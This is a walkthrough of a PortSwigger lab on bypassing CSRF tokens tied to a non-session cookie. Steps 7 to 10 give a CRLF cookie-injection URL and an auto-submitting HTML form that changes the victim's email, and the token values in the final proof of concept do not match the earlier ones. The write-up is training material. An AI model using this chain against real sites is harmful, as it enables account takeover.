# CSRF where token is tied to non-session cookie

## Description

[This lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)'s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system. 

## Reproduction and proof of concept

1. Open Burp's browser and log in to the `wiener` account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the `csrf` token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session. To check `csrf` cookie and `csrf` token are tied, enter an invalid token. The request is not accepted.
3. Open a private/incognito browser window, log in to Portswigger, then on the lab site into the `carlos` attacker account, and send a fresh update email request into Burp Repeater.
4. Swapping the `csrfKey` cookie and `csrf` parameter from the `carlos` account to the `wiener` account (or vv), the request is accepted.

```text
HTTP/1.1 302 Found
Location: /my-account
Connection: close
Content-Length: 0
```

Swapping only one of the two, the request is not accepted. The two are tied.

5. Close the Repeater tab and incognito browser.
6. Back in the original browser in the `wiener` account, do a search, send the resulting request to Burp Repeater. Check that the search term gets reflected in the `Set-Cookie` header. 

```text
GET /?search=whatever HTTP/1.1
Host: 0a8a007003328fbbc0520eb3006500e7.web-security-academy.net
Cookie: session=3434rpqGQke3AkVlNlulO9qFJKzTjK4J; csrfKey=h8xkUPRUr4PbtkKwRm6bORpJx5qWNibu
...
```

Because the search function has no CSRF protection, this can be used to inject cookies into the victim user's browser.

7. Create a URL that uses this vulnerability to inject a `csrfKey` cookie from the carlos attacker account into the victim's browser:

```text
/?search=test%0d%0aSet-Cookie:%20csrfKey=JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4%3b%20SameSite=None
```

Results:

```text
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4; SameSite=None; Secure; HttpOnly
```
    
8. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defences lab (above), ensuring that you include your CSRF token. The exploit should be created from the email change request.
9. Remove the auto-submit `script` block and replace it with the `/?search=test%0d%0aSet-Cookie:%20csrfKey=JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4%3b%20SameSite=None`, and change the `csrf` token to the tied `csrfKey` one of the attacker:

```text
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a8a007003328fbbc0520eb3006500e7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a8a007003328fbbc0520eb3006500e7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=49yoasBlApBjSMbVt4Qi2SddyqBHMqgn%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

**Copy HTML** and put it in the `body` of the **Exploit server** form:

![CSRF](/_static/images/csrf2.png)

10. **Store** the exploit in the exploit server of the lab, then click **Deliver to victim**.

## Exploitability

An attacker needs to use the exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. There are two accounts on the application that can be used: `wiener:peter` (victim) and `carlos:montoya` (attacker).

## Impact

If an attacker can change the email address of another user, he/she can log in as that user and gain access to the account and all of its data.
